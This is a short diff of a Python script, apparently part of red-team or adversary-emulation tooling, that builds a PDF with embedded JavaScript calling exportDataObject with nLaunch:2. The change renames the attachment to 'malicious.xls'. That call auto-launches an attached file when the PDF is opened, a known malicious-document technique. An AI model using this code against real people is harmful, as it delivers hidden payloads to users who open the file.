@@ -9,5 +9,5 @@ for i in xrange(ipdf.getNumPages()):
 	output.addPage(page)
 
 with open('02.pdf', 'wb') as f:
-	output.addJS("this.exportDataObject({cName:\"T1192.xls\",nLaunch:2,});")
+	output.addJS("this.exportDataObject({cName:\"malicious.xls\",nLaunch:2,});")
 	output.write(f)
